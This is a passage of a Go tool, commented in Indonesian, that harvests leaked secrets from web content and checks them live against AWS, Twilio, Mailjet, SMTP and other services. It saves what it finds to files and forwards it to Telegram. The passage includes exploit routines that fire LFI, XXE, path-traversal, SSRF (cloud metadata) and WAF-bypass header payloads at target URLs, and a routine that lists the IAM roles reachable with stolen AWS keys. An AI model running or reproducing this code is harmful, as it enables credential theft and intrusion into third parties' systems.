		{a.MailtrapAPIKeyPattern,  a.Config.APIValidation.Mailtrap,  "Mailtrap",  a.CheckMailtrap},
		{a.HerokuAPIKeyPattern,    a.Config.APIValidation.Heroku,    "Heroku",    a.CheckHeroku},
		{a.DatadogAPIKeyPattern,   a.Config.APIValidation.Datadog,   "Datadog",   a.CheckDatadog},
	}

	var wg sync.WaitGroup
	// Batasi concurrent API validations untuk semua checks
	validationSem := make(chan struct{}, 50)

	// Tencent need special handling (require access key + secret)
	tencentKeys := unique(a.TencentAccessKeyPattern.FindAllString(contentToScan, -1))
	for _, key := range tencentKeys {
		if _, loaded := a.KnownKeys.LoadOrStore(key, true); !loaded {
			a.logFound("Tencent", key, sourceURL)
			wg.Add(1)
			validationSem <- struct{}{}
			go func(k, u string) {
				defer wg.Done()
				defer func() { <-validationSem }()
				a.CheckTencent(k, u)
			}(key, sourceURL)
		}
	}

	// Aliyun scanning disabled

	for _, check := range apiChecks {
		if check.Feature { // Hanya jalankan jika diaktifkan di APIValidation
			keys := unique(check.Pattern.FindAllString(contentToScan, -1))
			for _, key := range keys {
				a.logFound(check.Name, key, sourceURL)
				wg.Add(1)
				validationSem <- struct{}{}
				go func(k, url string, fn func(string, string) bool) {
					defer wg.Done()
					defer func() { <-validationSem }()
					fn(k, url)
				}(key, sourceURL, check.CheckFn)
			}
		}
	}

	nonValidatedChecks := []struct {
		Pattern *regexp.Regexp
		Name    string
	}{
		{a.AzureSASTokenPattern, "Azure SAS Token"},
		// Wave-5 additions — pattern-only (no live API validator yet)
		{a.SlackBotTokenPattern, "Slack Bot Token"},
		{a.SlackUserTokenPattern, "Slack User Token"},
		{a.SlackWebhookPattern, "Slack Webhook"},
		{a.DiscordBotTokenPattern, "Discord Bot Token"},
		{a.DiscordWebhookPattern, "Discord Webhook"},
		{a.CloudflareGlobalPattern, "Cloudflare Global"},
		{a.DigitalOceanPATPattern, "DigitalOcean PAT"},
		{a.SentryDSNPattern, "Sentry DSN"},
		{a.NpmTokenPattern, "NPM Token"},
		{a.PyPITokenPattern, "PyPI Token"},
		{a.GitLabPATPattern, "GitLab PAT"},
		{a.JWTPattern, "JWT"},
		{a.AWSSNSTopicARNPattern, "AWS SNS Topic ARN"},
	}

	for _, check := range nonValidatedChecks {
		keys := unique(check.Pattern.FindAllString(contentToScan, -1))
		for _, key := range keys {
			if _, loaded := a.KnownKeys.LoadOrStore(key, true); !loaded {
				a.logFound(check.Name, key, sourceURL)
				a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), strings.ReplaceAll(check.Name, " ", "_")+"_found.txt")

				if check.Name != "JWT" {
					displayKey := key
					if len(displayKey) > 100 {
						displayKey = displayKey[:100] + "..."
					}
					msg := a.tgHit("🔍", check.Name, sourceURL) + fmt.Sprintf(
						"\n🆔 CREDENTIALS\nValue : %s\n", displayKey)
					go a.sendTelegram(msg)
				}

				globalCounters.mu.Lock()
				globalCounters.APIsFoundTotal++
				globalCounters.mu.Unlock()
			}
		}
	}

	if a.Config.ScanningFeatures.AWSMainScan { // Menggunakan flag baru untuk AWS
		// Gabungkan semua potensi Access Key: AKIA (Standar) dan ASIA (SES/Federated/Temporary)
		sesKeys := unique(a.AWSSESUserPattern.FindAllString(contentToScan, -1))
		sks := unique(a.AWSSecretKeyPatternInfo.FindAllString(contentToScan, -1))
		sessionTokens := unique(a.AWSSessionTokenPattern.FindAllString(contentToScan, -1))

		// 1. Validasi semua pasangan AK (AKIA/ASIA) dan SK
		for _, ak := range sesKeys {
			for _, sk := range sks {
				if len(sk) == 40 {
					keyPair := fmt.Sprintf("%s:%s", ak, sk)

					// Gunakan KnownKeys untuk mencegah API call ganda dari goroutine yang berbeda
					if _, loaded := a.KnownKeys.LoadOrStore(keyPair, true); loaded {
						continue
					}

					// Check for specific SES prefix to distinguish log output
					name := "AWS (Standard/SES Potential)"
					if strings.HasPrefix(ak, "ASIA") {
						name = "AWS (SES/Federated Potential)"
					}

					a.logFound(name, keyPair, sourceURL)
					globalCounters.mu.Lock()
					globalCounters.APIsFoundTotal++
					globalCounters.mu.Unlock()

					// Lakukan validasi penuh (STS:GetCallerIdentity) di goroutine
					wg.Add(1)
					validationSem <- struct{}{}
					go func(ak, sk, u, keyName string) {
						defer wg.Done()
						defer func() { <-validationSem }()
						pterm.Info.Printfln("[CHECK] Validating %s Key: %s...", keyName, ak[:8]+"...")

						valid, identity, cfg, s3Status := a.validateAWSCredentials(ak, sk, "")

						if valid {
							// Jika valid, handle sebagai kunci AWS yang sah
							a.handleValidAWS(ak, sk, "", u, identity, cfg, s3Status)
							globalCounters.mu.Lock()
							globalCounters.APIsValidated++
							globalCounters.mu.Unlock()
						} else {
							// Jika gagal validasi, simpan sebagai potential key yang belum terverifikasi
							a.saveIntoFile(fmt.Sprintf("%s:%s:%s", u, ak, sk), "aws_ses_potential_unverified.txt")
							pterm.Debug.Printfln("[AWS FAIL] Key %s failed full STS validation.", ak[:8]+"...")
						}
					}(ak, sk, sourceURL, name)
				}
			}
		}

		// 2. Validasi pasangan AK, SK, dan Session Token (AKIA/ASIA + SK + ST)
		for _, ak := range sesKeys {
			for _, sk := range sks {
				for _, st := range sessionTokens {
					keyTriplet := fmt.Sprintf("%s:%s:%s", ak, sk, st)

					if _, loaded := a.KnownKeys.LoadOrStore(keyTriplet, true); loaded {
						continue
					}

					name := "AWS (Session Token)"
					a.logFound(name, keyTriplet, sourceURL)
					globalCounters.mu.Lock()
					globalCounters.APIsFoundTotal++
					globalCounters.mu.Unlock()

					wg.Add(1)
					validationSem <- struct{}{}
					go func(ak, sk, st, u, keyName string) {
						defer wg.Done()
						defer func() { <-validationSem }()
						pterm.Info.Printfln("[CHECK] Validating %s Key: %s...", keyName, ak[:8]+"...")

						valid, identity, cfg, s3Status := a.validateAWSCredentials(ak, sk, st)
						if valid {
							a.handleValidAWS(ak, sk, st, u, identity, cfg, s3Status)
							globalCounters.mu.Lock()
							globalCounters.APIsValidated++
							globalCounters.mu.Unlock()
						} else {
							pterm.Debug.Printfln("[AWS FAIL] Session Key %s failed full STS validation.", ak[:8]+"...")
						}
					}(ak, sk, st, sourceURL, name)
				}
			}
		}
	}

	// Pengecekan Twilio menggunakan APIValidation
	if a.Config.APIValidation.Twilio {
		sids := unique(a.TwilioSIDPatternInfo.FindAllString(contentToScan, -1))
		auths := unique(a.TwilioAuthPatternInfo.FindAllString(contentToScan, -1))
		encoded := unique(a.TwilioEncodePatternInfo.FindAllString(contentToScan, -1))
		for _, enc := range encoded {
			if dec, err := base64.StdEncoding.DecodeString(enc); err == nil {
				parts := strings.Split(string(dec), ":")
				if len(parts) == 2 {
					sids = append(sids, parts[0])
					auths = append(auths, parts[1])
				}
			}
		}

		for _, sid := range sids {
			for _, auth := range auths {
				a.logFound("Twilio", fmt.Sprintf("%s:%s", sid, auth), sourceURL)
				wg.Add(1)
				validationSem <- struct{}{}
				go func(s, aT, u string) {
					defer wg.Done()
					defer func() { <-validationSem }()
					a.CheckTwilio(s, aT, u)
				}(sid, auth, sourceURL)
			}
		}
	}

	// Pengecekan Nexmo menggunakan APIValidation
	if a.Config.APIValidation.Nexmo {
		keys := make([]string, 0)
		secrets := make([]string, 0)

		km := a.NexmoApiPatternInfo.FindAllStringSubmatch(contentToScan, -1)
		for _, m := range km {
			if len(m) > 2 {
				keys = append(keys, m[2])
			}
		}

		sm := a.NexmoSecretPatternInfo.FindAllStringSubmatch(contentToScan, -1)
		for _, m := range sm {
			if len(m) > 2 {
				secrets = append(secrets, m[2])
			}
		}

		for _, k := range unique(keys) {
			for _, s := range unique(secrets) {
				a.logFound("Nexmo", fmt.Sprintf("%s:%s", k, s), sourceURL)
				wg.Add(1)
				validationSem <- struct{}{}
				go func(k, s, u string) {
					defer wg.Done()
					defer func() { <-validationSem }()
					a.CheckNexmo(k, s, u)
				}(k, s, sourceURL)
			}
		}
	}

	// Mailjet: needs API key + secret key for Basic Auth
	if a.Config.APIValidation.Mailjet {
		apiKeys := make([]string, 0)
		secretKeys := make([]string, 0)
		for _, m := range a.MailjetAPIKeyPattern.FindAllStringSubmatch(contentToScan, -1) {
			if len(m) > 1 {
				apiKeys = append(apiKeys, m[1])
			}
		}
		for _, m := range a.MailjetSecretKeyPattern.FindAllStringSubmatch(contentToScan, -1) {
			if len(m) > 1 {
				secretKeys = append(secretKeys, m[1])
			}
		}
		for _, ak := range unique(apiKeys) {
			for _, sk := range unique(secretKeys) {
				a.logFound("Mailjet", fmt.Sprintf("%s:%s", ak, sk), sourceURL)
				wg.Add(1)
				validationSem <- struct{}{}
				go func(k, s, u string) {
					defer wg.Done()
					defer func() { <-validationSem }()
					a.CheckMailjet(k, s, u)
				}(ak, sk, sourceURL)
			}
		}
	}

	// Plivo: needs auth ID + auth token for Basic Auth
	if a.Config.APIValidation.Plivo {
		authIDs := make([]string, 0)
		authTokens := make([]string, 0)
		for _, m := range a.PlivoAuthIDPattern.FindAllStringSubmatch(contentToScan, -1) {
			if len(m) > 1 {
				authIDs = append(authIDs, m[1])
			}
		}
		for _, m := range a.PlivoAuthTokenPattern.FindAllStringSubmatch(contentToScan, -1) {
			if len(m) > 1 {
				authTokens = append(authTokens, m[1])
			}
		}
		for _, aid := range unique(authIDs) {
			for _, at := range unique(authTokens) {
				a.logFound("Plivo", fmt.Sprintf("%s:%s", aid, at), sourceURL)
				wg.Add(1)
				validationSem <- struct{}{}
				go func(id, t, u string) {
					defer wg.Done()
					defer func() { <-validationSem }()
					a.CheckPlivo(id, t, u)
				}(aid, at, sourceURL)
			}
		}
	}

	// Pengecekan SMTP menggunakan ScanningFeatures
	a.extractAndTestSMTP(contentToScan, sourceURL)

	a.extractAndSaveCryptoKeys(contentToScan, sourceURL)

	// Ekstraksi menggunakan AST - hanya mengambil pola yang sesuai dengan regex yang sudah didefinisikan
	a.extractValidatorsFromCode(contentToScan, sourceURL)

	wg.Wait()
}

// Exploit functions untuk ekstraksi credentials
// React2Shell - exploit React applications untuk ekstraksi credentials
func (a *AWSScanner) ExploitReact2Shell(targetURL, sourceURL string) {
	payloads := []string{
		"/api/config",
		"/api/env",
		"/.env",
		"/config.json",
		"/package.json",
		"/src/config.js",
		"/src/config.ts",
		"/public/config.json",
		"/build/static/js/main.js",
		"/build/static/js/bundle.js",
		"/static/js/main.js",
		"/static/js/bundle.js",
	}

	foundCount := 0
	maxFindings := 3 // Limit findings per exploit untuk mencegah spam

	for _, payload := range payloads {
		if foundCount >= maxFindings {
			pterm.Debug.Printfln("[REACT2SHELL] Early exit after %d findings", foundCount)
			break // Early exit jika sudah menemukan cukup banyak
		}

		fullURL := targetURL + payload
		req, err := http.NewRequest("GET", fullURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
		req.Header.Set("Accept", "*/*")

		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		resp, err := client.Do(req.WithContext(ctx))
		cancel()

		if err == nil {
			defer resp.Body.Close()
			if resp.StatusCode == 200 {
				body, err := ioutil.ReadAll(resp.Body)
				if err == nil {
					content := string(body)
					// Track jika ada content yang meaningful
					if len(content) > 100 {
						a.checkAndSaveKeys(content, sourceURL+" (react2shell:"+payload+")")
						foundCount++
					}
				}
			}
		}
	}
}

// BypassWAF - teknik bypass WAF untuk ekstraksi credentials
func (a *AWSScanner) ExploitBypassWAF(targetURL, sourceURL string) {
	// Teknik bypass WAF dengan encoding dan header manipulation
	bypassPayloads := []string{
		"/api/v1/config",
		"/api/v1/env",
		"/api/v1/secrets",
		"/.git/config",
		"/.env",
		"/config/config.json",
		"/app/config.json",
	}

	bypassHeaders := []map[string]string{
		{"X-Forwarded-For": "127.0.0.1"},
		{"X-Real-IP": "127.0.0.1"},
		{"X-Originating-IP": "127.0.0.1"},
		{"X-Remote-IP": "127.0.0.1"},
		{"X-Remote-Addr": "127.0.0.1"},
		{"X-Client-IP": "127.0.0.1"},
		{"X-Forwarded-Host": "localhost"},
		{"X-Original-URL": "/.env"},
		{"X-Rewrite-URL": "/.env"},
	}

	foundCount := 0
	maxFindings := 2 // Limit findings untuk bypass WAF

outerLoop:
	for _, payload := range bypassPayloads {
		for _, headers := range bypassHeaders {
			if foundCount >= maxFindings {
				pterm.Debug.Printfln("[BYPASS-WAF] Early exit after %d findings", foundCount)
				break outerLoop // Exit dari nested loop
			}

			fullURL := targetURL + payload
			req, _ := http.NewRequest("GET", fullURL, nil)
			for k, v := range headers {
				req.Header.Set(k, v)
			}
			req.Header.Set("User-Agent", "Mozilla/5.0")

			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			resp, err := client.Do(req.WithContext(ctx))
			cancel()

			if err == nil {
				defer resp.Body.Close()
				if resp.StatusCode == 200 {
					body, _ := ioutil.ReadAll(resp.Body)
					content := string(body)
					if len(content) > 100 {
						a.checkAndSaveKeys(content, sourceURL+" (bypass-waf:"+payload+")")
						foundCount++
					}
				}
			}
		}
	}
}

// BypassMiddleware - exploit middleware untuk ekstraksi credentials
func (a *AWSScanner) ExploitBypassMiddleware(targetURL, sourceURL string) {
	// Teknik bypass middleware dengan path traversal dan parameter pollution
	middlewarePayloads := []string{
		"/../.env",
		"/..//.env",
		"/....//....//.env",
		"/%2e%2e%2f.env",
		"/%2e%2e%2f%2e%2e%2f.env",
		"/api/config?path=../.env",
		"/api/config?file=../../.env",
		"/api/config?path=....//....//.env",
		"/admin/config?redirect=/.env",
		"/api/v1/config?callback=/.env",
	}

	foundCount := 0
	maxFindings := 2 // Limit findings untuk bypass middleware

	for _, payload := range middlewarePayloads {
		if foundCount >= maxFindings {
			pterm.Debug.Printfln("[BYPASS-MIDDLEWARE] Early exit after %d findings", foundCount)
			break // Early exit
		}

		fullURL := targetURL + payload
		req, _ := http.NewRequest("GET", fullURL, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")
		req.Header.Set("Accept", "*/*")

		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		resp, err := client.Do(req.WithContext(ctx))
		cancel()

		if err == nil {
			defer resp.Body.Close()
			if resp.StatusCode == 200 {
				body, _ := ioutil.ReadAll(resp.Body)
				content := string(body)
				if len(content) > 100 {
					a.checkAndSaveKeys(content, sourceURL+" (bypass-middleware:"+payload+")")
					foundCount++
				}
			}
		}
	}
}

// ExploitLFI - Local File Inclusion untuk ekstraksi credentials
func (a *AWSScanner) ExploitLFI(targetURL, sourceURL string) {
	lfiPayloads := []string{
		"/?file=../../../../etc/passwd",
		"/?page=../../../../etc/passwd",
		"/?include=../../../../etc/passwd",
		"/?path=../../../../etc/passwd",
		"/?doc=../../../../etc/passwd",
		"/?document=../../../../etc/passwd",
		"/?folder=../../../../etc/passwd",
		"/?root=../../../../etc/passwd",
		"/?page=php://filter/read=string.rot13/resource=../../../../etc/passwd",
		"/?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd",
		"/?file=../../../../.env",
		"/?page=../../../../.env",
		"/?include=../../../../.env",
		"/?path=../../../../.env",
		"/?doc=../../../../.env",
		"/?document=../../../../.env",
		"/?folder=../../../../.env",
		"/?root=../../../../.env",
		"/?file=../../../../config.json",
		"/?page=../../../../config.json",
		"/?include=../../../../config.json",
		"/?path=../../../../config.json",
	}

	foundCount := 0
	maxFindings := 1 // LFI jarang berhasil, 1 finding cukup

	for _, payload := range lfiPayloads {
		if foundCount >= maxFindings {
			pterm.Debug.Printfln("[LFI] Early exit after %d findings", foundCount)
			break // Early exit
		}

		fullURL := targetURL + payload
		req, _ := http.NewRequest("GET", fullURL, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")

		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		resp, err := client.Do(req.WithContext(ctx))
		cancel()

		if err == nil {
			defer resp.Body.Close()
			if resp.StatusCode == 200 {
				body, _ := ioutil.ReadAll(resp.Body)
				content := string(body)
				// Cek apakah berhasil membaca file (bukan error page)
				if strings.Contains(content, "root:") || strings.Contains(content, "AKIA") || strings.Contains(content, "api_key") || strings.Contains(content, "SECRET") {
					a.checkAndSaveKeys(content, sourceURL+" (lfi:"+payload+")")
					foundCount++
				}
			}
		}
	}
}

// ExploitXXE - XML External Entity untuk ekstraksi credentials
func (a *AWSScanner) ExploitXXE(targetURL, sourceURL string) {
	xxePayloads := []string{
		`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
		`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>`,
		`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>`,
		`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///.env">]><foo>&xxe;</foo>`,
		`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=file:///.env">]><foo>&xxe;</foo>`,
		`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///.env">]><foo>&xxe;</foo>`,
	}

	xxeEndpoints := []string{
		"/api/xml",
		"/api/upload",
		"/api/parse",
		"/api/process",
		"/upload",
		"/parse",
		"/process",
		"/xml",
		"/soap",
		"/wsdl",
	}

	foundCount := 0
	maxFindings := 1 // XXE jarang berhasil, 1 finding cukup

outerLoop:
	for _, endpoint := range xxeEndpoints {
		for _, payload := range xxePayloads {
			if foundCount >= maxFindings {
				pterm.Debug.Printfln("[XXE] Early exit after %d findings", foundCount)
				break outerLoop // Exit dari nested loop
			}

			fullURL := targetURL + endpoint
			req, _ := http.NewRequest("POST", fullURL, strings.NewReader(payload))
			req.Header.Set("Content-Type", "application/xml")
			req.Header.Set("User-Agent", "Mozilla/5.0")

			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			resp, err := client.Do(req.WithContext(ctx))
			cancel()

			if err == nil {
				defer resp.Body.Close()
				if resp.StatusCode == 200 {
					body, _ := ioutil.ReadAll(resp.Body)
					content := string(body)
					// Cek apakah berhasil membaca file
					if strings.Contains(content, "root:") || strings.Contains(content, "AKIA") || strings.Contains(content, "api_key") || strings.Contains(content, "SECRET") {
						a.checkAndSaveKeys(content, sourceURL+" (xxe:"+endpoint+")")
						foundCount++
					}
				}
			}
		}
	}
}

// ExploitSSRF - Server-Side Request Forgery untuk ekstraksi credentials
func (a *AWSScanner) ExploitSSRF(targetURL, sourceURL string) {
	ssrfPayloads := []string{
		"/?url=http://127.0.0.1:80",
		"/?url=http://127.0.0.1:443",
		"/?url=http://127.0.0.1:8080",
		"/?url=http://127.0.0.1:3000",
		"/?url=http://127.0.0.1:5000",
		"/?url=http://localhost:80",
		"/?url=http://localhost:443",
		"/?url=http://localhost:8080",
		"/?url=http://localhost:3000",
		"/?url=http://localhost:5000",
		"/?url=http://169.254.169.254/latest/meta-data/",
		"/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		"/?url=http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
		"/?url=http://169.254.169.254/metadata/instance?api-version=2018-02-01",
		"/?url=file:///etc/passwd",
		"/?url=file:///.env",
		"/?url=file:///config.json",
		"/?url=gopher://127.0.0.1:80",
		"/?url=dict://127.0.0.1:80",
		"/?url=ldap://127.0.0.1:80",
		"/?target=http://127.0.0.1:80",
		"/?uri=http://127.0.0.1:80",
		"/?path=http://127.0.0.1:80",
		"/?link=http://127.0.0.1:80",
		"/?src=http://127.0.0.1:80",
		"/?dest=http://127.0.0.1:80",
		"/?redirect=http://127.0.0.1:80",
		"/?callback=http://127.0.0.1:80",
		"/?webhook=http://127.0.0.1:80",
		"/api/fetch?url=http://127.0.0.1:80",
		"/api/proxy?url=http://127.0.0.1:80",
		"/api/request?url=http://127.0.0.1:80",
	}

	foundCount := 0
	maxFindings := 2 // SSRF bisa menemukan metadata yang berguna, limit 2

	for _, payload := range ssrfPayloads {
		if foundCount >= maxFindings {
			pterm.Debug.Printfln("[SSRF] Early exit after %d findings", foundCount)
			break // Early exit
		}

		fullURL := targetURL + payload
		req, _ := http.NewRequest("GET", fullURL, nil)
		req.Header.Set("User-Agent", "Mozilla/5.0")

		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		resp, err := client.Do(req.WithContext(ctx))
		cancel()

		if err == nil {
			defer resp.Body.Close()
			if resp.StatusCode == 200 {
				body, _ := ioutil.ReadAll(resp.Body)
				content := string(body)
				// Cek apakah berhasil membaca internal resources
				if strings.Contains(content, "AKIA") || strings.Contains(content, "api_key") || strings.Contains(content, "SECRET") || strings.Contains(content, "access-key") || strings.Contains(content, "secret-key") {
					a.checkAndSaveKeys(content, sourceURL+" (ssrf:"+payload+")")
					foundCount++
				}
			}
		}
	}
}

// ExtractIPOnly - ekstrak hanya IP address dari URL atau teks
func (a *AWSScanner) ExtractIPOnly(input string) []string {
	ipPattern := regexp.MustCompile(`(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)`)
	ips := ipPattern.FindAllString(input, -1)

	// Remove duplicates
	uniqueIPs := make(map[string]bool)
	result := []string{}
	for _, ip := range ips {
		if !uniqueIPs[ip] {
			uniqueIPs[ip] = true
			result = append(result, ip)
		}
	}

	return result
}

// Exploit functions for AWS - similar to main.py
func (a *AWSScanner) exploitAWSRoles(cfg aws.Config, accountID string) map[string]interface{} {
	exploitResults := make(map[string]interface{})

	// Check for default roles
	defaultRolePatterns := []string{
		"OrganizationAccountAccessRole",
		"OrganizationAccountAccessRole-*",
		"ReadOnlyAccess",
		"PowerUserAccess",
		"AdministratorAccess",
	}

	iamClient := iam.NewFromConfig(cfg)
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// Try to list roles
	roles, err := iamClient.ListRoles(ctx, &iam.ListRolesInput{MaxItems: aws.Int32(100)})
	if err == nil && roles != nil {
		for _, role := range roles.Roles {
			roleName := *role.RoleName
			for _, pattern := range defaultRolePatterns {
				if strings.Contains(roleName, pattern) || roleName == pattern {
					exploitResults[roleName] = map[string]interface{}{
						"arn":  *role.Arn,
						"type": "default_role",
					}
				}
			}
		}
	}

	return exploitResults
}

// AST Parser structure for extracting validators from code
type ASTParser struct {
	// This structure can be extended to parse different languages
	// For now, we'll use regex-based extraction
}

// Extract validators from code using pattern matching (simplified AST approach)
// Extract validators from code using pattern matching (simplified AST approach)
// Hanya mengambil pola yang sesuai dengan regex patterns yang sudah didefinisikan, tidak mengambil value lain
func (a *AWSScanner) extractValidatorsFromCode(code, sourceURL string) {
	// Advanced SMTP extraction dengan multiple pattern matching
	// Fungsi ini lebih baik dalam ekstraksi SMTP karena:
	// 1. Bisa detect format JSON, environment variables, PHP config, dll
	// 2. Menggunakan proximity matching untuk field yang berdekatan
	// 3. Lebih flexible dalam menangani variasi penulisan

	if !a.Config.ScanningFeatures.SMTPCredentialsScan {
		return
	}

	// Skip JavaScript files - terlalu banyak false positives
	if strings.Contains(sourceURL, ".js") || strings.Contains(sourceURL, "/assets/") ||
		strings.Contains(sourceURL, "/static/js/") || strings.Contains(sourceURL, "/build/") {
		return
	}

	// Pattern untuk ekstraksi SMTP yang lebih advanced
	smtpConfigs := a.extractSMTPFromMultipleFormats(code, sourceURL)

	for _, config := range smtpConfigs {
		// Validasi kelengkapan
		if config["host"] == "" || config["port"] == "" ||
			config["user"] == "" || config["pass"] == "" || config["from"] == "" {
			continue
		}

		host := config["host"]
		port := config["port"]
		user := config["user"]
		pass := config["pass"]
		from := config["from"]

		// Validasi STRICT untuk mencegah false positives
		if !a.isValidSMTPConfig(host, port, user, pass, from) {
			continue
		}

		// SMTP valid ditemukan
		smtpLine := fmt.Sprintf("%s:%s:%s:%s:%s", host, port, user, pass, from)
		a.logFound("SMTP (AST)", smtpLine, sourceURL)
		a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, smtpLine), "smtp_found.txt")

		// Test SMTP jika email target dikonfigurasi
		if a.Config.SMTPTestEmail != "" {
			a.testSMTPConnection(host, port, user, pass, from, sourceURL)
		}
	}
}

// isValidSMTPConfig melakukan validasi ketat untuk SMTP config
func (a *AWSScanner) isValidSMTPConfig(host, port, user, pass, from string) bool {
	// 1. Validasi Host - harus domain valid atau IP
	if !strings.Contains(host, ".") {
		return false
	}
	// Host tidak boleh mengandung karakter JS seperti (), {}, =, dll
	if strings.ContainsAny(host, "(){}[]=><,;|&") {
		return false
	}
	// Host harus format domain yang reasonable
	hostPattern := regexp.MustCompile(`^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$`)
	if !hostPattern.MatchString(host) {
		return false
	}

	// 2. Validasi Port - hanya port SMTP yang valid
	validSMTPPorts := []string{"25", "465", "587", "2525", "2587"}
	portValid := false
	for _, validPort := range validSMTPPorts {
		if port == validPort {
			portValid = true
			break
		}
	}
	if !portValid {
		return false
	}

	// 3. Validasi User - tidak boleh terlalu pendek atau mengandung karakter JS
	if len(user) < 3 || len(user) > 200 {
		return false
	}
	if strings.ContainsAny(user, "(){}[]<>;|&=") {
		return false
	}

	// 4. Validasi Password - blacklist values yang invalid
	invalidPasswords := []string{"null", "undefined", "none", "password", "pass", "secret",
		"123456", "admin", "test", "example", "()", "{}", "[]", "=>"}
	passLower := strings.ToLower(pass)
	for _, invalid := range invalidPasswords {
		if passLower == invalid {
			return false
		}
	}
	// Password tidak boleh terlalu pendek atau mengandung JS syntax
	if len(pass) < 4 || len(pass) > 200 {
		return false
	}
	if strings.ContainsAny(pass, "(){}[]<>;|&") {
		return false
	}

	// 5. Validasi From - harus email valid
	if !strings.Contains(from, "@") || !strings.Contains(from, ".") {
		return false
	}
	emailPattern := regexp.MustCompile(`^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$`)
	if !emailPattern.MatchString(from) {
		return false
	}
	// From tidak boleh mengandung JS syntax
	if strings.ContainsAny(from, "(){}[]<>;|&=") {
		return false
	}

	return true
}

// extractSMTPFromMultipleFormats mengekstrak SMTP config dari berbagai format
func (a *AWSScanner) extractSMTPFromMultipleFormats(code, sourceURL string) []map[string]string {
	configs := []map[string]string{}

	// Hanya gunakan format specific untuk file non-JS
	isJSFile := strings.Contains(sourceURL, ".js")

	// Format 1: JSON/JavaScript Object - Skip untuk JS files
	if !isJSFile {
		configs = append(configs, a.extractSMTPFromJSON(code)...)
	}

	// Format 2: Environment Variables (.env style) - SAFE untuk semua file
	configs = append(configs, a.extractSMTPFromEnv(code)...)

	// Format 3: PHP Config Array - Skip untuk JS files
	if !isJSFile {
		configs = append(configs, a.extractSMTPFromPHP(code)...)
	}

	// Format 4: XML/Properties - SAFE untuk semua file
	configs = append(configs, a.extractSMTPFromXML(code)...)

	// Format 5: Proximity-based extraction - SKIP untuk JS files (terlalu banyak false positives)
	// Proximity matching tidak cocok untuk JS karena syntax yang kompleks
	if !isJSFile {
		configs = append(configs, a.extractSMTPByProximity(code)...)
	}

	return configs
}

// extractSMTPFromJSON extract dari format JSON
// SKIP untuk JS files karena terlalu banyak false positives
func (a *AWSScanner) extractSMTPFromJSON(code string) []map[string]string {
	configs := []map[string]string{}

	// Pattern untuk JSON object dengan SMTP config yang lebih strict
	// Harus mengandung keyword "smtp" atau "mail" DAN field-field config
	jsonPattern := regexp.MustCompile(`(?s)\{[^}]{20,500}(?:smtp|mail)[^}]{20,500}\}`)
	matches := jsonPattern.FindAllString(code, -1)

	for _, match := range matches {
		// Skip jika match mengandung JS code indicators
		if strings.Contains(match, "function") || strings.Contains(match, "=>") ||
			strings.Contains(match, "return ") || strings.Contains(match, ".map(") {
			continue
		}

		config := make(map[string]string)

		// Extract fields dari JSON dengan pattern yang lebih ketat
		// Host: harus ada "host" atau "smtp_host" sebagai key
		if m := regexp.MustCompile(`["'](?:smtp_host|mail_host|host)["']\s*:\s*["']([a-z0-9][a-z0-9.-]+\.[a-z]{2,})["']`).FindStringSubmatch(match); len(m) > 1 {
			config["host"] = strings.TrimSpace(m[1])
		}
		// Port: harus ada "port" sebagai key
		if m := regexp.MustCompile(`["'](?:smtp_port|mail_port|port)["']\s*:\s*["']?(\d+)["']?`).FindStringSubmatch(match); len(m) > 1 {
			config["port"] = strings.TrimSpace(m[1])
		}
		// User: harus ada "user" atau "username" sebagai key
		if m := regexp.MustCompile(`["'](?:smtp_user|mail_user|smtp_username|mail_username|user|username)["']\s*:\s*["']([^"']{3,})["']`).FindStringSubmatch(match); len(m) > 1 {
			config["user"] = strings.TrimSpace(m[1])
		}
		// Password: harus ada "password" atau "pass" sebagai key
		if m := regexp.MustCompile(`["'](?:smtp_password|mail_password|smtp_pass|mail_pass|password|pass)["']\s*:\s*["']([^"']{4,})["']`).FindStringSubmatch(match); len(m) > 1 {
			config["pass"] = strings.TrimSpace(m[1])
		}
		// From: harus ada "from" sebagai key dan valid email
		if m := regexp.MustCompile(`["'](?:smtp_from|mail_from|from|from_email)["']\s*:\s*["']([a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,})["']`).FindStringSubmatch(match); len(m) > 1 {
			config["from"] = strings.TrimSpace(m[1])
		}

		if len(config) >= 5 {
			configs = append(configs, config)
		}
	}

	return configs
}

// extractSMTPFromEnv extract dari format environment variables
func (a *AWSScanner) extractSMTPFromEnv(code string) []map[string]string {
	configs := []map[string]string{}
	config := make(map[string]string)
